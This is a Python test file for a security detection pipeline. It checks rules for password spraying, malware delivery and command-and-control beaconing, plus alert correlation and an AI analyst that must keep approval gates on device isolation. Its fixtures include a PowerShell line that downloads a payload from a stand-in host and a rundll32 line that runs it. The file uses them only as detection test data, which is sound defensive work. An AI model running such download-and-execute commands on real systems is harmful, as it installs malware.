from __future__ import annotations

from unittest.mock import patch

import pandas as pd

from ai_analyst.agent import get_last_analyst_metadata, run_analyst_agent
from ai_analyst.output_validator import validate_analyst_output
from data_generation.attack_simulator import generate_multistage_attack_scenario
from detection.alert_engine import analyze_security_events
from detection.authentication_rules import detect_password_spray
from detection.network_rules import detect_command_and_control_beaconing
from detection.process_rules import detect_malware_delivery_activity
from incidents.correlation_engine import correlate_alerts
from incidents.timeline_builder import build_incident_timeline


def _base_event(**overrides: object) -> dict[str, object]:
    event = {
        "EventID": "event-0",
        "EventTime": pd.Timestamp("2026-07-21 10:00:00"),
        "DeviceName": "WS-1",
        "UserName": "user1",
        "EventType": "Authentication",
        "EventResult": "Failure",
        "EventSeverity": "High",
        "SourceIP": "203.0.113.10",
        "DestinationIP": "",
        "ProcessName": "",
        "CommandLine": "",
        "ParentProcessName": "",
        "Country": "Unknown",
        "RawMessage": "",
    }
    event.update(overrides)
    return event


def _password_spray_events(
    *,
    source_ip: str = "203.0.113.10",
    start: pd.Timestamp = pd.Timestamp("2026-07-21 10:00:00"),
    users: list[str] | None = None,
) -> pd.DataFrame:
    users = users or ["admin", "alice", "bob", "carol", "dave", "erin", "frank", "grace"]
    return pd.DataFrame(
        [
            _base_event(
                EventID=f"spray-{index}",
                EventTime=start + pd.Timedelta(minutes=index),
                UserName=user,
                SourceIP=source_ip,
            )
            for index, user in enumerate(users)
        ]
    )


def _malware_chain_events(device: str = "WS-1") -> pd.DataFrame:
    return pd.DataFrame(
        [
            _base_event(
                EventID="download-1",
                EventTime=pd.Timestamp("2026-07-21 11:00:00"),
                DeviceName=device,
                EventType="Process",
                EventResult="Success",
                ProcessName="powershell.exe",
                CommandLine="powershell.exe Invoke-WebRequest https://example.test/payload.exe -OutFile payload.exe",
            ),
            _base_event(
                EventID="exec-1",
                EventTime=pd.Timestamp("2026-07-21 11:03:00"),
                DeviceName=device,
                EventType="Process",
                EventResult="Success",
                ProcessName="rundll32.exe",
                CommandLine="rundll32.exe payload.dll,Start",
            ),
        ]
    )


def _beacon_events(intervals: list[int] | None = None, destination: str = "203.0.113.77") -> pd.DataFrame:
    intervals = intervals or [0, 60, 121, 181, 242]
    start = pd.Timestamp("2026-07-21 12:00:00")
    return pd.DataFrame(
        [
            _base_event(
                EventID=f"beacon-{index}",
                EventTime=start + pd.Timedelta(seconds=seconds),
                EventType="NetworkConnection",
                EventResult="Success",
                DestinationIP=destination,
                ProcessName="svc.exe",
                CommandLine="svc.exe",
            )
            for index, seconds in enumerate(intervals)
        ]
    )


def test_password_spray_detects_one_source_targeting_many_users() -> None:
    alerts = detect_password_spray(_password_spray_events())

    assert len(alerts) == 1
    assert alerts.iloc[0]["RuleID"] == "AUTH_PASSWORD_SPRAY"
    assert alerts.iloc[0]["AlertType"] == "Password Spray"
    assert alerts.iloc[0]["MITRETechnique"] == "T1110.003 - Password Spraying"


def test_password_spray_does_not_trigger_for_many_failures_against_one_user() -> None:
    events = _password_spray_events(users=["alice"] * 8)

    assert detect_password_spray(events).empty


def test_password_spray_does_not_combine_different_source_ips() -> None:
    left = _password_spray_events(source_ip="203.0.113.10", users=["a", "b", "c", "d"])
    right = _password_spray_events(source_ip="203.0.113.11", users=["e", "f", "g", "h"])
    events = pd.concat([left, right], ignore_index=True)

    assert detect_password_spray(events).empty


def test_password_spray_respects_time_window() -> None:
    events = _password_spray_events()
    events["EventTime"] = [
        pd.Timestamp("2026-07-21 10:00:00") + pd.Timedelta(minutes=index * 2)
        for index in range(len(events))
    ]

    assert detect_password_spray(events, window_minutes=10).empty


def test_password_spray_recognizes_privileged_user_targeting() -> None:
    alerts = detect_password_spray(_password_spray_events(users=["admin", "a", "b", "c", "d", "e", "f", "g"]))

    assert alerts.iloc[0]["AlertSeverity"] == "Critical"
    assert "admin" in alerts.iloc[0]["Metadata"]["PrivilegedUsersTargeted"]


def test_password_spray_correlates_into_incident() -> None:
    alerts = detect_password_spray(_password_spray_events())
    incidents = correlate_alerts(alerts)

    assert len(incidents) == 1
    assert incidents.iloc[0]["CorrelationPattern"] == "Password Spray Attempt"
    assert incidents.iloc[0]["RecommendedActionID"] == "BLOCK_DESTINATION_IP"


def test_malware_execution_correlates_download_with_execution() -> None:
    alerts = detect_malware_delivery_activity(_malware_chain_events())
    incidents = correlate_alerts(alerts)

    assert {"Suspicious Download Command", "Suspicious File Execution"}.issubset(set(alerts["AlertType"]))
    assert len(incidents) == 1
    assert incidents.iloc[0]["CorrelationPattern"] == "Malware Download and Execution"
    assert incidents.iloc[0]["RecommendedActionID"] == "ISOLATE_DEVICE"


def test_malware_detection_does_not_correlate_benign_certutil_alone() -> None:
    events = pd.DataFrame(
        [
            _base_event(
                EventID="certutil-1",
                EventType="Process",
                EventResult="Success",
                ProcessName="certutil.exe",
                CommandLine="certutil.exe -hashfile report.txt SHA256",
            )
        ]
    )

    assert detect_malware_delivery_activity(events).empty
    assert correlate_alerts(detect_malware_delivery_activity(events)).empty


def test_malware_correlation_does_not_cross_machines() -> None:
    download = _malware_chain_events("WS-1").iloc[[0]].copy()
    execution = _malware_chain_events("WS-2").iloc[[1]].copy()
    alerts = detect_malware_delivery_activity(pd.concat([download, execution], ignore_index=True))

    assert correlate_alerts(alerts).empty


def test_malware_correlation_respects_event_order_and_window() -> None:
    events = _malware_chain_events()
    events.loc[1, "EventTime"] = pd.Timestamp("2026-07-21 12:00:00")
    alerts = detect_malware_delivery_activity(events)

    assert correlate_alerts(alerts).empty


def test_malware_incident_includes_evidence_ids_and_approved_action() -> None:
    alerts = detect_malware_delivery_activity(_malware_chain_events())
    incident = correlate_alerts(alerts).iloc[0]

    assert set(incident["RelatedAlertIDs"]).issubset(set(alerts["AlertID"]))
    assert incident["RecommendedActionID"] == "ISOLATE_DEVICE"


def test_beaconing_detects_regular_outbound_intervals() -> None:
    alerts = detect_command_and_control_beaconing(_beacon_events())

    assert len(alerts) == 1
    assert alerts.iloc[0]["RuleID"] == "NETWORK_BEACONING"
    assert alerts.iloc[0]["AlertType"] == "Command-and-Control Beaconing"


def test_beaconing_tolerates_bounded_jitter() -> None:
    alerts = detect_command_and_control_beaconing(_beacon_events([0, 60, 123, 181, 245]))

    assert len(alerts) == 1


def test_beaconing_rejects_irregular_ordinary_traffic() -> None:
    alerts = detect_command_and_control_beaconing(_beacon_events([0, 12, 98, 330, 900]))

    assert alerts.empty


def test_beaconing_does_not_combine_different_destinations() -> None:
    left = _beacon_events([0, 60, 120], destination="203.0.113.77")
    right = _beacon_events([180, 240], destination="203.0.113.88")
    alerts = detect_command_and_control_beaconing(pd.concat([left, right], ignore_index=True))

    assert alerts.empty


def test_beaconing_respects_minimum_connection_count() -> None:
    alerts = detect_command_and_control_beaconing(_beacon_events([0, 60, 120, 180]))

    assert alerts.empty


def test_beaconing_correlates_into_incident() -> None:
    alerts = detect_command_and_control_beaconing(_beacon_events())
    incidents = correlate_alerts(alerts)

    assert len(incidents) == 1
    assert incidents.iloc[0]["CorrelationPattern"] == "Command-and-Control Beaconing"


def test_existing_multistage_intrusion_remains_unchanged() -> None:
    alerts = analyze_security_events(generate_multistage_attack_scenario())
    incidents = correlate_alerts(alerts)

    assert len(incidents) == 1
    assert incidents.iloc[0]["CorrelationPattern"] == "Multi-Stage Intrusion"
    assert set(incidents.iloc[0]["RelatedAlertTypes"]) >= {
        "Failed Login Burst",
        "Successful Login After Failures",
        "Suspicious PowerShell",
        "Suspicious Outbound Connection",
    }


def test_alerts_are_sorted_and_duplicate_incidents_are_not_emitted() -> None:
    alerts = analyze_security_events(generate_multistage_attack_scenario()).sample(frac=1, random_state=7)
    incidents = correlate_alerts(alerts)

    assert len(incidents) == 1
    assert incidents.iloc[0]["RelatedAlertIDs"] == list(dict.fromkeys(incidents.iloc[0]["RelatedAlertIDs"]))


def test_entity_boundaries_are_enforced() -> None:
    alerts = pd.concat(
        [
            detect_malware_delivery_activity(_malware_chain_events("WS-1").iloc[[0]]),
            detect_malware_delivery_activity(_malware_chain_events("WS-2").iloc[[1]]),
        ],
        ignore_index=True,
    )

    assert correlate_alerts(alerts).empty


def test_deterministic_input_creates_deterministic_incident_output() -> None:
    alerts = detect_password_spray(_password_spray_events())

    first = correlate_alerts(alerts)
    second = correlate_alerts(alerts)

    assert first.iloc[0]["IncidentID"] == second.iloc[0]["IncidentID"]


def test_machine_criticality_can_raise_incident_severity_after_evidence() -> None:
    alerts = detect_command_and_control_beaconing(_beacon_events())
    inventory = pd.DataFrame(
        [{"DeviceName": "WS-1", "DeviceCriticality": "Critical"}]
    )
    incidents = correlate_alerts(alerts, machine_inventory=inventory)

    assert len(incidents) == 1
    assert incidents.iloc[0]["HighestAlertSeverity"] == "Critical"


def test_new_incident_passes_existing_analyst_validation() -> None:
    alerts = detect_malware_delivery_activity(_malware_chain_events())
    incident = correlate_alerts(alerts).iloc[0]
    timeline = build_incident_timeline(incident, alerts)
    analysis = run_analyst_agent(incident, timeline, environment_name="SME Office")
    valid, errors = validate_analyst_output(analysis, incident)

    assert valid is True
    assert errors == []


def test_defender_approval_floor_remains_enforced_for_new_incident() -> None:
    alerts = detect_malware_delivery_activity(_malware_chain_events())
    incident = correlate_alerts(alerts).iloc[0]
    timeline = build_incident_timeline(incident, alerts)
    analysis = run_analyst_agent(incident, timeline, environment_name="SME Office")

    assert analysis["RecommendedActionID"] == "ISOLATE_DEVICE"
    assert analysis["RequiresApproval"] is True


def test_hybrid_analyst_handles_new_incident_type_with_mocked_ollama() -> None:
    alerts = detect_command_and_control_beaconing(_beacon_events())
    incident = correlate_alerts(alerts).iloc[0]
    timeline = build_incident_timeline(incident, alerts)
    deterministic = run_analyst_agent(incident, timeline, environment_name="SME Office")
    model_analysis = dict(deterministic)
    model_analysis.update(
        {
            "Status": "confirmed",
            "Summary": "Local model explanation based only on beaconing evidence.",
            "SuspicionReason": "Regular outbound timing supports command-and-control beaconing.",
            "Inferences": ["Inference: The repeated destination and timing pattern is beacon-like."],
        }
    )

    with patch("ai_analyst.agent.generate_structured_analysis", return_value=model_analysis):
        analysis = run_analyst_agent(
            incident,
            timeline,
            environment_name="SME Office",
            mode="hybrid",
        )
    metadata = get_last_analyst_metadata()

    assert analysis["ThreatType"] == "Command-and-Control Beaconing"
    assert metadata["UsedFallback"] is False
